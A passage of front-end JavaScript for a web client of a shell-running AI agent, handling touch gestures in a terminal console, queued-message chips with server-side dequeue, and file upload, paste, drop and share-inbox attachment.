  if (consoleSelectMode) setConsoleSelectMode(false); // always leave Select mode
  $("pty-share").hidden = true;
});
// Native (touch) selection changes don't fire xterm's onSelectionChange, so
// mirror the Copy button's visibility off the document selection too — checking
// the combined state so a collapsed native selection hides it (unless xterm
// still holds one from a desktop mouse drag).
document.addEventListener("selectionchange", () => {
  if (!consoleOpen) return;
  $("pty-share").hidden = !consoleSelectionText().trim();
});

document.querySelector(".pty-keys").addEventListener("click", (e) => {
  const btn = e.target.closest("button[data-key]");
  if (!btn) return;
  consoleKeyFeedback(btn); // blink + haptic so a tap registers without key travel
  if (btn.dataset.key === "kb") { consoleToggleKeyboard(); return; }
  if (btn.dataset.key === "ctrl") {
    const now = Date.now();
    if (now - lastCtrlTap < 350) setConsoleCtrlMode("locked"); // double-tap → lock Ctrl
    else setConsoleCtrlMode(consoleCtrlMode === "off" ? "armed" : "off"); // tap: arm / unlock
    lastCtrlTap = now;
    if (consoleTerm) consoleTerm.focus();
    return;
  }
  if (btn.dataset.key === "select") { setConsoleSelectMode(!consoleSelectMode); return; }
  if (btn.dataset.key === "copy") { consoleCopy(); return; }
  if (btn.dataset.key === "paste") { consolePaste(); return; }
  const CTRL = { tab: "\t", esc: "\x1b" }; // arrows: the drag pad below
  const seq = CTRL[btn.dataset.key];
  if (seq != null) consoleSend(seq);
  if (consoleTerm) consoleTerm.focus();
});

// Keep the overlay inside the VISIBLE viewport and refit xterm on any viewport
// change — the iOS soft keyboard show/hide fires visualViewport resize (not
// window resize), and a fixed element does not shrink above the keyboard on its
// own, so without this the keys row hides behind the keyboard and the terminal
// keeps its old cols/rows. Rotation comes through window resize/orientationchange.
function consoleReflowViewport() {
  if (!consoleOpen) return;
  // A browser opened OVER the console owns the screen and the keyboard while it
  // is up. Reflowing here would resize the remote PTY (TIOCSWINSZ) to whatever
  // the browser's own keyboard left — repainting a program behind a sheet
  // nobody is looking through, for a keyboard that is not its.
  if (!$("browser-sheet").hidden) return;
  const ov = $("pty-overlay");
  if (window.visualViewport) {
    ov.style.height = `${visualViewport.height}px`;
    // Pin to the top — the body is already frozen (body.console-open). Do NOT
    // follow visualViewport.offsetTop: a swipe rubber-bands the visual viewport
    // and, tracking offsetTop, the whole overlay slid down as if scrolling (the
    // arrow-drag "console goes down" bug). offsetTop is ~0 with the body fixed.
    ov.style.top = "0px";
    // The keyboard already covers the home-indicator safe area, so drop the
    // overlay's bottom inset while it's up — otherwise it renders as a dead
    // black gap between the key row and the keyboard (#151). Restored (「」) when
    // the keyboard is down so the keys still clear the home indicator.
    const kbUp = visualViewport.height < window.innerHeight - 80;
    ov.style.paddingBottom = kbUp ? "0px" : "";
  }
  if (padOpen()) resizePadInput(); // the pad's max height follows the visible viewport
  consoleFitAndResize();
}
window.addEventListener("resize", consoleReflowViewport);
window.addEventListener("orientationchange", () => setTimeout(consoleReflowViewport, 250));
if (window.visualViewport) {
  visualViewport.addEventListener("resize", consoleReflowViewport);
  visualViewport.addEventListener("scroll", consoleReflowViewport);
}
// Block browser pinch-zoom (#148): the font A-/A+ resize the terminal instead of
// zooming the page. The viewport meta covers standalone PWAs; this catches the
// iOS Safari pinch gesture it sometimes ignores. Double-tap zoom is handled by
// the viewport meta / touch-action.
document.addEventListener("gesturestart", (e) => e.preventDefault());
document.addEventListener("gesturechange", (e) => e.preventDefault());

// iOS terminal scroll: a touch swipe doesn't scroll xterm on its own, so
// translate it into a real WHEEL event and let xterm handle it EXACTLY like the
// desktop mouse wheel — scrollback in normal mode, and forwarded as mouse-wheel
// to the program (tmux / vim / less) when it has mouse mode on. preventDefault
// so the page behind the console never moves. Wired once on the persistent
// #pty-screen, guarded by consoleOpen. (#151 follow-up)
//
// Text selection (#151 follow-up): we ONLY hijack a real finger DRAG. A tap, double-tap, or
// stationary long-press is never preventDefault'd, so iOS's own selection
// gestures (double-tap a word, long-press) fire untouched on the DOM-rendered
// rows (user-select re-enabled for touch in style.css). Once something IS
// selected we stand down entirely, so dragging the selection handles extends it
// and the selection survives for Copy/Share. Nobody drags to scroll after
// holding/double-tapping, so "a plain drag = scroll" has no false positives.
(() => {
  const screen = $("pty-screen");
  const SLOP = 10; // px of travel before a touch is judged a deliberate scroll drag
  const HOLD_MS = 650; // stationary hold that turns on Select mode — kept just
                       // past iOS's ~500ms long-press so the rows are still
                       // user-select:none through its window (iOS won't grab it)
  let touchY = 0, startX = 0, startY = 0, scrolling = false;
  let selAnchor = null; // collapsed caret Range where a select-mode drag began
  // Hold-to-select: a stationary hold turns ON the same Select mode the chip
  // gives (crosshair, paint, handles). A scroll drag that starts moving before
  // the timer fires cancels it, so scrolling wins whenever the finger is moving;
  // to leave Select mode and scroll again, tap the Select chip (it glows) or Copy.
  let holdTimer = 0, touching = false;
  let heldLink = false; // this hold raised the link menu — the lift belongs to it

  // The text caret under a screen point (WebKit vs standard spelling).
  const caretAt = (x, y) => {
    if (document.caretRangeFromPoint) return document.caretRangeFromPoint(x, y);
    if (document.caretPositionFromPoint) {
      const p = document.caretPositionFromPoint(x, y);
      if (!p) return null;
      const r = document.createRange(); r.setStart(p.offsetNode, p.offset); r.collapse(true); return r;
    }
    return null;
  };
  // Paint the selection from the drag's anchor caret to the caret under the
  // finger, ordering the two so the range is valid whichever way you drag.
  const paintTo = (x, y) => {
    const focus = caretAt(x, y);
    if (!selAnchor || !focus) return;
    const range = document.createRange();
    if (selAnchor.compareBoundaryPoints(Range.START_TO_START, focus) <= 0) {
      range.setStart(selAnchor.startContainer, selAnchor.startOffset);
      range.setEnd(focus.startContainer, focus.startOffset);
    } else {
      range.setStart(focus.startContainer, focus.startOffset);
      range.setEnd(selAnchor.startContainer, selAnchor.startOffset);
    }
    const s = window.getSelection(); s.removeAllRanges(); s.addRange(range);
  };

  screen.addEventListener("touchstart", (e) => {
    if (e.touches.length !== 1) { scrolling = false; selAnchor = null; return; }
    const t = e.touches[0];
    if (consoleSelectMode) {
      e.preventDefault(); // keep the touch from reaching tmux/scroll — we own it
      const sel = window.getSelection();
      // If a selection already exists, a touch near either END grabs THAT handle
      // and re-anchors on the opposite (fixed) end — so you adjust one side
      // independently, like iOS's selection handles, instead of restarting.
      if (sel && !sel.isCollapsed && sel.rangeCount) {
        const range = sel.getRangeAt(0);
        const rects = range.getClientRects();
        if (rects.length) {
          const first = rects[0], last = rects[rects.length - 1];
          const startPt = { x: first.left, y: first.top + first.height / 2 };
          const endPt = { x: last.right, y: last.top + last.height / 2 };
          const d = (p) => Math.hypot(t.clientX - p.x, t.clientY - p.y);
          const dStart = d(startPt), dEnd = d(endPt);
          const GRAB = 60; // generous touch target around each handle
          if (Math.min(dStart, dEnd) <= GRAB) {
            const grabStart = dStart <= dEnd;
            const fixed = range.cloneRange();
            fixed.collapse(!grabStart); // pin the opposite end; drag moves this one
            selAnchor = fixed;
            return; // keep the selection; touchmove drags the grabbed handle
          }
        }
      }
      // No selection, or a touch away from both handles → start a fresh region.
      selAnchor = caretAt(t.clientX, t.clientY);
      if (sel) sel.removeAllRanges();
      return;
    }
    touchY = t.clientY; startX = t.clientX; startY = t.clientY; scrolling = false;
    // Hold still ~0.5s (no scroll drag claimed it first) → turn ON Select mode,
    // anchored here so the SAME finger can drag on to paint. A move past SLOP
    // before then cancels it (see touchmove), so a real scroll is never caught.
    touching = true;
    clearTimeout(holdTimer);
    holdTimer = setTimeout(() => {
      if (!touching || scrolling || consoleSelectMode || !consoleOpen) return;
      if (navigator.vibrate) { try { navigator.vibrate(10); } catch (err) { /* ignore */ } }
      // A hold that landed ON a URL asks where to open it instead; anywhere
      // else the gesture still means Select mode. consoleHoldAt decides and
      // opens the menu, so there is one answer to "was that a link?" and the
      // tap's link provider is the thing that gives it.
      if (consoleHoldAt(consoleTerm, screen, startX, startY) === "link") {
        touching = false;
        heldLink = true; // so the lift is swallowed below, as Select mode's is
        return;
      }
      setConsoleSelectMode(true);
      selAnchor = caretAt(startX, startY);
    }, HOLD_MS);
  }, { passive: false });
  screen.addEventListener("touchmove", (e) => {
    if (!consoleOpen || e.touches.length !== 1) return;
    const t = e.touches[0];
    if (consoleSelectMode) {
      // Paint an arbitrary region from finger position — independent of tmux,
      // which touch can't drive as a drag.
      e.preventDefault();
      if (!selAnchor) { selAnchor = caretAt(t.clientX, t.clientY); return; }
      paintTo(t.clientX, t.clientY);
      return;
    }
    // NOT in select mode → a finger drag scrolls; scrolling must never be
    // wedged off.
    if (!scrolling) {
      if (Math.abs(t.clientX - startX) < SLOP && Math.abs(t.clientY - startY) < SLOP) return;
      scrolling = true;
      clearTimeout(holdTimer); // moved before the hold armed → it's a scroll
      touchY = t.clientY; // anchor here so the SLOP travel isn't scrolled in one jump
      // A deliberate scroll drag: drop any leftover selection so it can't stand
      // the handler down (a stale selection used to freeze scrolling).
      const s = window.getSelection && window.getSelection();
      if (s && s.rangeCount) s.removeAllRanges();
    }
    e.preventDefault(); // the swipe drives the terminal, not the page
    const y = t.clientY;
    const deltaY = touchY - y; // natural: swipe up → wheel down (toward newer)
    touchY = y;
    if (!deltaY) return;
    // Dispatch on the touched element so it routes through xterm's own wheel
    // listeners (scrollback OR mouse-mode forwarding), same as a desktop wheel.
    (e.target || screen).dispatchEvent(
      new WheelEvent("wheel", { deltaY, deltaMode: 0, bubbles: true, cancelable: true })
    );
  }, { passive: false });
  const end = (e) => {
    // In Select mode, swallow the lift so iOS doesn't synthesize a click that
    // re-focuses the textarea (bringing the keyboard back). The focus guard
    // above is the backstop; this avoids the flash.
    //
    // A hold that raised the LINK MENU swallows it for a sharper reason,
    // measured in a real Chrome: the synthesised click lands on whatever is
    // under the finger, which is now the menu's own scrim — so the menu was
    // dismissed by the gesture that opened it, every time, and vanished before
    // it could be read. Near the bottom of the screen, where the menu is
    // clamped up under the finger, that stray click would land on a ROW and
    // open the link nobody chose.
    if ((consoleSelectMode || heldLink) && e && e.cancelable) e.preventDefault();
    // The menu may act now — except for this lift's OWN click, which is still
    // owed and is identified by the point the hold happened at.
    if (heldLink) consoleHoldEnded(startX, startY);
    heldLink = false;
    scrolling = false; selAnchor = null; touching = false; clearTimeout(holdTimer);
  };
  screen.addEventListener("touchend", end, { passive: false });
  screen.addEventListener("touchcancel", end);
})();

// Blink-style arrow pad (#148): ONE key you drag for direction — drag ↑/↓/←/→
// sends that arrow key, and holding in a direction repeats it (a compact d-pad
// instead of four chips, and it gives ← → which we lacked). Touch-only — the
// key row is hidden on desktop, where a real keyboard has arrows. A tap without
// a drag does nothing.
(() => {
  const btn = document.querySelector('.pty-keys button[data-key="arrows"]');
  if (!btn) return;
  const ARROW = { up: "\x1b[A", down: "\x1b[B", right: "\x1b[C", left: "\x1b[D" };
  const THRESH = 14;         // px before a direction registers
  const INITIAL_DELAY = 450; // hold this long before auto-repeat starts, so a
                             // quick swipe sends exactly ONE arrow, not two
  const NEAR_MS = 320, FAR_MS = 45; // repeat interval near vs far from the button
  const FAR_DIST = 170;      // distance (px, from the button) that reaches FAR_MS
  // Direction and distance are measured from the fixed touch-START point (no
  // re-anchoring), so "how far from the button" grows as you drag out — the
  // farther you hold, the faster it repeats.
  let ox = 0, oy = 0, dir = null, curDist = 0, timer = null;
  const dirOf = (dx, dy) => {
    if (Math.abs(dx) < THRESH && Math.abs(dy) < THRESH) return null;
    return Math.abs(dx) > Math.abs(dy) ? (dx > 0 ? "right" : "left") : (dy > 0 ? "down" : "up");
  };
  // A DOUBLE-TAP (two taps that sent no arrow) opens the dictation scratchpad —
  // free real estate on this key, since a tap without a drag does nothing.
  const DOUBLE_MS = 400;
  let pressed = false, lastTap = 0;
  const press = (d) => {
    if (d && consoleOpen) { pressed = true; consoleSend(ARROW[d]); consoleKeyFeedback(btn); }
  };
  const intervalFor = (dist) => {
    const t = Math.min(1, Math.max(0, (dist - THRESH) / (FAR_DIST - THRESH)));
    return Math.round(NEAR_MS - t * (NEAR_MS - FAR_MS)); // farther → shorter → faster
  };
  const clear = () => { clearTimeout(timer); timer = null; };
  const armRepeat = () => { // wait INITIAL_DELAY, then repeat, re-timed by distance each tick
    clear();
    timer = setTimeout(function tick() {
      if (!dir) return;
      press(dir);
      timer = setTimeout(tick, intervalFor(curDist));
    }, INITIAL_DELAY);
  };
  const stop = () => { clear(); dir = null; };
  btn.addEventListener("touchstart", (e) => {
    e.preventDefault();
    ox = e.touches[0].clientX; oy = e.touches[0].clientY; dir = null; curDist = 0; pressed = false; clear();
  }, { passive: false });
  btn.addEventListener("touchmove", (e) => {
    e.preventDefault();
    const dx = e.touches[0].clientX - ox, dy = e.touches[0].clientY - oy;
    curDist = Math.hypot(dx, dy);
    const d = dirOf(dx, dy);
    if (!d) { stop(); return; }                        // back near the button: cancel
    if (d !== dir) { dir = d; press(d); armRepeat(); } // new direction: one press, (re)start the delay
  }, { passive: false });
  btn.addEventListener("touchend", (e) => {
    e.preventDefault();
    stop();
    if (pressed) { lastTap = 0; return; } // a drag, not a tap
    const now = Date.now();
    if (now - lastTap < DOUBLE_MS) { lastTap = 0; consoleKeyFeedback(btn); openConsolePad(); }
    else lastTap = now;
  }, { passive: false });
  btn.addEventListener("touchcancel", stop);
})();

// Blink-style symbol keys (#153): each key shows a primary glyph with a smaller
// grey secondary above it. TAP → primary; swipe DOWN on the key → the grey
// secondary (armed while held, sent on release). A horizontal drag scrolls the
// row instead of sending anything. Injected before the copy/paste icons so they
// scroll together in the middle section.
function buildPtySymbols() {
  const mid = $("pty-syms");
  if (!mid || mid.dataset.built) return;
  // [primary (tap), secondary (swipe down)] — the iOS/Blink SmarterKeys set.
  const SYMS = [
    ["`", "~"], ["@", "#"], ["$", "^"], [";", ":"], ["-", "_"], ["=", "+"],
    ["[", "{"], ["]", "}"], ["\\", "|"], ["<", "*"], [">", '"'], ["/", "?"],
  ];
  const anchor = mid.firstChild; // the copy/paste buttons stay after the symbols
  for (const [s1, s2] of SYMS) {
    const b = document.createElement("button");
    b.type = "button"; b.className = "pty-sym";
    b.dataset.sym = s1; b.dataset.sym2 = s2;
    const top = document.createElement("span"); top.className = "pty-sym2"; top.textContent = s2;
    const bot = document.createElement("span"); bot.className = "pty-sym1"; bot.textContent = s1;
    b.append(top, bot);
    mid.insertBefore(b, anchor);
  }
  mid.dataset.built = "1";
}
buildPtySymbols();

// Swipe-down interaction for the symbol keys. Wired once on the mid container
// (delegation); copy/paste live here too but aren't .pty-sym, so they fall
// through to the .pty-keys click handler unchanged.
(() => {
  const mid = $("pty-syms");
  if (!mid) return;
  const DOWN = 12;    // px downward before the secondary arms
  const HSCROLL = 10; // px horizontal → treat as a row scroll, not a key press
  let cur = null, sx = 0, sy = 0, armed = false, scrolling = false;
  const arm = (on) => { armed = on; if (cur) cur.classList.toggle("sym-armed", on); };
  const reset = () => { if (cur) cur.classList.remove("sym-armed"); cur = null; armed = false; scrolling = false; };
  mid.addEventListener("touchstart", (e) => {
    const btn = e.target.closest(".pty-sym");
    if (!btn) { cur = null; return; }
    cur = btn; sx = e.touches[0].clientX; sy = e.touches[0].clientY; armed = false; scrolling = false;
  }, { passive: true });
  mid.addEventListener("touchmove", (e) => {
    if (!cur) return;
    const dx = e.touches[0].clientX - sx, dy = e.touches[0].clientY - sy;
    if (!scrolling && Math.abs(dx) > HSCROLL && Math.abs(dx) > Math.abs(dy)) {
      scrolling = true; arm(false); // horizontal wins → let the row scroll, cancel the key
    }
    if (scrolling) return; // native pan-x owns the horizontal scroll
    if (dy > DOWN && Math.abs(dy) > Math.abs(dx)) { e.preventDefault(); if (!armed) arm(true); }
    else if (armed && dy < DOWN) arm(false); // dragged back up before release
  }, { passive: false });
  mid.addEventListener("touchend", (e) => {
    if (cur && !scrolling) {
      // Cancel iOS's synthesized mouse/click: without this the button's
      // emulated mousedown steals focus from the xterm textarea AFTER our
      // focus() below, and iOS dismisses the soft keyboard on every key.
      e.preventDefault();
      consoleSend(armed ? cur.dataset.sym2 : cur.dataset.sym);
      consoleKeyFeedback(cur);
      if (consoleTerm) consoleTerm.focus();
    }
    reset();
  }, { passive: false });
  mid.addEventListener("touchcancel", reset);
})();

$("file-input").addEventListener("change", async () => {
  for (const file of $("file-input").files) await uploadFile(file);
  $("file-input").value = "";
});

$("photo-input").addEventListener("change", async () => {
  for (const file of $("photo-input").files) await uploadFile(file);
  $("photo-input").value = "";
});

// ---- message queue chips -------------------------------------------------
// A message sent while the agent is busy waits its turn; show it above the
// composer so it can be seen and cancelled (server-side dequeue).
function addQueueChip(text) {
  const list = $("queue-list");
  const chip = document.createElement("div");
  chip.className = "queue-chip";
  chip.dataset.text = text;
  chip.innerHTML =
    '<svg class="queue-ico" viewBox="0 0 24 24"><circle cx="12" cy="12" r="8" fill="none" stroke="currentColor" stroke-width="1.7"/><path d="M12 8v4.3l2.6 1.6" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>' +
    '<span class="queue-body"><span class="queue-text"></span><span class="queue-sub">Queued · sends when aish finishes</span></span>' +
    '<button class="queue-edit" type="button" aria-label="edit queued message"><svg viewBox="0 0 24 24"><path d="M12 19.5h8" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/><path d="M15.5 5.2a1.7 1.7 0 0 1 2.4 2.4l-8.3 8.3-3.2.8.8-3.2z" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/></svg></button>' +
    '<button class="queue-remove" type="button" aria-label="remove from queue"><svg viewBox="0 0 24 24"><path d="M7 7l10 10M17 7L7 17" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/></svg></button>';
  chip.querySelector(".queue-text").textContent = text;
  // Taking the chip away says the message will not be sent. Unreceipted that is
  // the most expensive lie in this file: the queue belongs to an agent that
  // runs shell commands, so a cancel that never landed means the thing you
  // withdrew RUNS, with nothing on screen still naming it. The chip goes back
  // ([ACK-LEDGER]) — and if the dequeue did land after all, the server's own
  // queue repaint drops it again on the next replay.
  const dequeue = () => act({ type: "dequeue", text }, {
    label: "cancelling that queued message",
    lost: () => addQueueChip(text),
  });
  chip.querySelector(".queue-remove").onclick = () => {
    dequeue();
    removeQueueChip(text);
  };
  // Edit: pull the message back into the composer to revise & resend (#14).
  chip.querySelector(".queue-edit").onclick = () => {
    dequeue();
    removeQueueChip(text);
    input.value = input.value ? `${text}\n${input.value}` : text;
    resizeInput();
    input.focus();
  };
  list.appendChild(chip);
  list.hidden = false;
  scrollToEnd();
}

function removeQueueChip(text) {
  const list = $("queue-list");
  const chip = [...list.children].find((c) => c.dataset.text === text);
  if (chip) chip.remove();
  if (!list.children.length) list.hidden = true;
}

// Every chip in the queue area belongs to ONE chat: it names a message that
// chat's agent is holding, and its Remove button dequeues from whatever session
// this client is viewing. So the whole area goes with the transcript.
//
// It used not to, and only for the message chips — the cwd card was already
// dropped here. A chip drawn while chat A was on screen therefore SURVIVED the
// switch to B and sat above B's composer, where "Remove" dequeued from B (a
// no-op) while A's message went on to run, and "Edit" pulled the text into B's
// composer while A still held its copy — one send away from running it twice,
// in two different chats. The server now re-sends the real queue on attach, so
// clearing here loses nothing: what comes back is the queue of the chat you
// actually landed in.
function clearQueueChips() {
  const list = $("queue-list");
  list.replaceChildren();
  list.hidden = true;
}

// A pending working-directory change (#92) shows as a single card pinned to the
// TOP of the queue — it applies first, before any queued messages. There is at
// most one; a second cd updates the existing card in place. Edit reopens the
// directory picker; Remove clears the pending change server-side.
function addCwdChip(path) {
  const list = $("queue-list");
  let chip = list.querySelector(".queue-chip.cwd");
  if (!chip) {
    chip = document.createElement("div");
    chip.className = "queue-chip cwd";
    chip.innerHTML =
      '<svg class="queue-ico" viewBox="0 0 24 24"><path d="M3.5 6.8a2 2 0 0 1 2-2h3.4l2 2.2h7.6a2 2 0 0 1 2 2v8.2a2 2 0 0 1-2 2h-13a2 2 0 0 1-2-2z" fill="none" stroke="currentColor" stroke-width="1.8"/></svg>' +
      '<span class="queue-body"><span class="queue-text"></span><span class="queue-sub">Queued · applies first</span></span>' +
      '<button class="queue-edit" type="button" aria-label="change queued directory"><svg viewBox="0 0 24 24"><path d="M12 19.5h8" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/><path d="M15.5 5.2a1.7 1.7 0 0 1 2.4 2.4l-8.3 8.3-3.2.8.8-3.2z" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/></svg></button>' +
      '<button class="queue-remove" type="button" aria-label="cancel directory change"><svg viewBox="0 0 24 24"><path d="M7 7l10 10M17 7L7 17" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/></svg></button>';
    // Edit reopens the directory picker (#92) — selecting there re-sends `cd`,
    // which overwrites pending_cwd and re-emits, updating this same card.
    chip.querySelector(".queue-edit").onclick = () => openDirSheet();
    chip.querySelector(".queue-remove").onclick = () => {
      // Same claim, and this one moves the APPROVAL ROOT when it applies.
      act({ type: "dequeue_cwd" }, {
        label: "cancelling that directory change",
        lost: () => addCwdChip(path),
      });
      removeCwdChip();
    };
    list.insertBefore(chip, list.firstChild); // pinned above message chips
  }
  chip.querySelector(".queue-text").textContent = `Change directory to ${abbreviatePath(path)}`;
  list.hidden = false;
  scrollToEnd();
}

function removeCwdChip() {
  const list = $("queue-list");
  const chip = list.querySelector(".queue-chip.cwd");
  if (chip) chip.remove();
  if (!list.children.length) list.hidden = true;
}

// [COMPOSER-FILES-START]
// Three ways a file reaches the composer, one destination: the ＋ picker, a
// PASTE, and a DROP. The picker was the only one for a long time, which on a
// desktop is the slowest possible way to hand over the screenshot you just
// took — the clipboard already holds it.
//
// What a file is CALLED is decided here, once, for all three. A pasted
// screenshot arrives as a Blob with an empty name (and Chrome's "image.png" is
// barely better), while /upload refuses an empty or dot-leading name — so a
// nameless paste would have failed with "invalid file name" and looked like the
// paste itself was unsupported.
function uploadName(file) {
  const given = (file.name || "").trim();
  if (given && !given.startsWith(".") && given !== "image.png") return given;
  const ext = ((file.type || "").split("/")[1] || "bin")
    .replace(/[^a-z0-9]/gi, "").slice(0, 5) || "bin";
  const stamp = new Date().toISOString().slice(0, 19).replace(/[:T]/g, "-");
  return `pasted-${stamp}.${ext}`;
}

// The files on a clipboard or a drag, from either of the two APIs that carry
// them (`.files` everywhere current; `.items` for the Safari versions that only
// populate that one).
function transferFiles(data) {
  if (!data) return [];
  if (data.files && data.files.length) return Array.from(data.files);
  return Array.from(data.items || [])
    .filter((item) => item.kind === "file")
    .map((item) => item.getAsFile())
    .filter(Boolean);
}

// Paste is ADDITIVE and never calls preventDefault. Copying a chart out of a
// spreadsheet, or an image off a web page, puts BOTH an image and text on the
// clipboard; swallowing the event to take the image would silently drop the
// text the owner may well have been after. So the files become attachments and
// the browser's own text paste still runs — nothing on the clipboard is lost.
// (The composer is a <textarea>, where a file paste has no default behaviour of
// its own, so there is nothing to suppress.)
async function onInputPaste(event) {
  for (const file of transferFiles(event.clipboardData)) await uploadFile(file);
}
// [COMPOSER-FILES-END]

// [FILE-DROP-START]
// Dropping a file onto a web page NAVIGATES to it by default — the chat would
// simply disappear, replaced by the image, with the draft gone. So every
// dragover carrying files is prevented; that is what makes the drop ours.
// Bound on the window rather than the composer: aiming at a one-line box is a
// worse target than the whole conversation, and the highlight says where it
// will land either way.
function fileDrag(event) {
  return Array.from(event.dataTransfer ? event.dataTransfer.types || [] : [])
    .includes("Files");
}

function installFileDrop(target, body) {
  let depth = 0; // dragenter/leave fire per element crossed, not per window
  const show = (on) => body.classList.toggle("dropping", on);
  target.addEventListener("dragenter", (event) => {
    if (!fileDrag(event)) return;
    depth++;
    show(true);
  });
  target.addEventListener("dragover", (event) => {
    if (fileDrag(event)) event.preventDefault();
  });
  target.addEventListener("dragleave", () => {
    depth = Math.max(0, depth - 1);
    if (!depth) show(false);
  });
  target.addEventListener("drop", async (event) => {
    depth = 0;
    show(false);
    if (!fileDrag(event)) return;
    event.preventDefault();
    for (const file of transferFiles(event.dataTransfer)) await uploadFile(file);
  });
}
// [FILE-DROP-END]

async function uploadFile(file) {
  const query = new URLSearchParams({ name: uploadName(file) });
  if (token) query.set("token", token);
  let response;
  try {
    response = await fetch(`${BASE}upload?${query}`, { method: "POST", body: file });
  } catch {
    showToast(`upload failed: ${file.name}`);
    return;
  }
  if (!response.ok) {
    const body = await response.json().catch(() => ({}));
    showToast(`upload failed: ${body.error || response.status}`);
    return;
  }
  const { path } = await response.json();
  // Name it from the path the SERVER chose: a second cat.png is stored as
  // cat-1.png, and a chip still reading "cat.png" would name the wrong file.
  const name = path.split("/").pop() || uploadName(file);
  attachments.push({ name, path });
  insertEmbedAtCaret(name);
  renderAttachments();
}

// [EMBED-AT-CARET-START]
// A file joins the message WHERE YOU ARE TYPING (#233) — but only when that is
// somewhere you actually are.
//
// ATTACHING AT THE END IS STILL A PHOTO ON ITS OWN LINE, and that correction
// matters more than the feature. Writing a question and then tapping ＋ leaves
// the caret at the end, which is the ordinary way every attachment has ever
// been made — and the first version put the reference on that same line, so an
// ordinary photo came out rendered at text height. A smudge, in place of the
// thumbnail that used to be there (#234). The end of the message is not "inside
// the sentence"; it is the end.
//
// So: a caret with nothing but whitespace after it appends a BLOCK — its own
// line, its own big picture, exactly as before. Inline is what you get when the
// cursor is genuinely in the middle of what you wrote, which is a deliberate
// act and the only case position was ever the point of.
//
// Two rules keep the inline case from being annoying: it never lands mid-word
// (a space on whichever side lacks one), and an EMPTY composer gets nothing —
// a photo sent with no words is a whole message by itself, the server appends
// the reference on send, and typing one in just to delete it is a step nobody
// asked for.
function insertEmbedAtCaret(name) {
  if (!input.value.trim()) return;
  const at = input.selectionStart ?? input.value.length;
  const before = input.value.slice(0, at);
  const after = input.value.slice(at);
  if (!after.trim()) {
    // At the end: a block, on its own line, like every attachment before this.
    input.value = `${before.replace(/\s+$/, "")}\n![[${name}]]`;
    const caret = input.value.length;
    input.setSelectionRange(caret, caret);
  } else {
    const embed =
      (before && !/\s$/.test(before) ? " " : "") +
      `![[${name}]]` +
      (/^\s/.test(after) ? "" : " ");
    input.value = before + embed + after;
    const caret = before.length + embed.length;
    input.setSelectionRange(caret, caret);
  }
  resizeInput();
  saveDraft();
}
// [EMBED-AT-CARET-END]

// [SHARES-START]
// What the iPhone share sheet handed over. The server holds the inbox and is
// the only writer of it; this reconciles the composer against whatever the last
// `hello`/`shared` said and never keeps its own copy — two devices claiming
// from one inbox is the normal case (phone shares it, laptop uses it), and a
// local list would drift the moment the other one claimed something.
//
// A shared FILE is attached to your next message straight away. It used to be a
// chip you had to TAP first, on the theory that a share landing mid-sentence
// must not join a message you were already writing. That theory cost a real
// send: the strip sits in the composer's attachment zone, so it reads as
// already attached — you type a prompt, press send, and only the words go. The
// file was still sitting in the inbox, correctly, and completely uselessly.
//
// The safety property was never about the tap. It is that a share starts
// NOTHING: no session, no model call. That is enforced on the server and is
// untouched by attaching it here — you still write the prompt, you still press
// send, and the ✕ still takes it back out.
//
// Shared TEXT stays a chip, because there is no equivalent of ✕ for text that
// has appended itself to a half-written sentence.
//
// Consumed on SEND, not on attach: close the tab without sending and the item
// is still waiting next time, rather than silently spent.
let sharesPainted = false; // a later arrival is news; the first paint is not

function renderShares(items) {
  // The server's list is the truth, including "the other device used it".
  const live = new Set(items.map((item) => item.id));
  const kept = attachments.filter((a) => !a.share || live.has(a.share));
  let touched = kept.length !== attachments.length;
  attachments = kept;

  for (const item of items) {
    if (item.path && !attachments.some((a) => a.share === item.id)) {
      attachments.push({
        name: item.name || item.path.split("/").pop(),
        path: item.path,
        share: item.id, // what makes it releasable on send, and revocable above
      });
      touched = true;
      if (sharesPainted) {
        showToast(`${item.name} attached — shared from ${item.source || "your phone"}`);
      }
    }
    if (item.text) takeSharedText(item);
  }
  if (touched) renderAttachments();
  sharesPainted = true;
  openChatForFreshShares(items);
}

// Shared TEXT goes into the composer, appended at the END with a separator.
//
// Not at the cursor, and without stealing focus: this is not something the
// owner just asked for with a keystroke, it is an arrival, and inserting at the
// cursor could split a word while focusing would throw the keyboard up on a
// phone unasked. Appending cannot destroy anything — whatever was already there
// is still there, with the link after it.
//
// It is consumed IMMEDIATELY, unlike a file. The asymmetry is not an oversight:
// a file lives in an attachment chip that is NOT persisted, so it has to stay
// in the inbox until the message is actually sent or a reload would lose it,
// while text lands in the draft, which IS persisted. One principle — consume it
// once it is somewhere it cannot be lost — and two answers.
//
// The ledger is what keeps a repaint from appending the same link twice: `hello`
// repeats the inbox on every connect, and a `share_drop` that never lands leaves
// the item exactly where it was.
const textTaken = new Set();

function takeSharedText(item) {
  if (textTaken.has(item.id)) return;
  // Terminal mode's composer is a shell command line; a URL appended to it
  // would be nonsense. Leave the item in the inbox — the next repaint, or the
  // next time the app is opened, finds it again.
  if (cmdMode) return;
  textTaken.add(item.id);
  composerAppend(item.text);
  if (sharesPainted) {
    showToast(`link from ${item.source || "your phone"} added`);
  }
  dropShare(item.id);
}

function composerAppend(text) {
  // On its OWN LINE, not after a space: a shared link is somebody else's words
  // arriving in the middle of yours, and a line of its own is what makes the
  // two tellable apart at a glance in a long prompt. Trailing spaces are taken
  // with it, or the line you were writing keeps an invisible tail.
  const current = input.value.replace(/[ \t]+$/, "");
  const gap = !current || current.endsWith("\n") ? "" : "\n";
  input.value = current + gap + text;
  // The input event is what saves the draft, re-measures the box (a second line
  // makes it taller) and updates the suggestion popover — everything a
  // keystroke would have done.
  input.dispatchEvent(new Event("input", { bubbles: true }));
}

// A share posted with `chat=new` wants its own conversation instead of landing
// on top of whatever was last open. It rides on the ITEM rather than on the
// launch URL because iOS will not open an installed web app at an address of
// your choosing — `webapp://…/?new` starts the app and drops the query — so
// `?new` ([OPEN-NEW]) can only ever work for a browser tab or a second Home
// Screen icon. This works however the app was opened.
//
// The attachment is NOT re-done afterwards: attachments deliberately survive a
// session switch, so whatever was just attached rides into the new chat. That
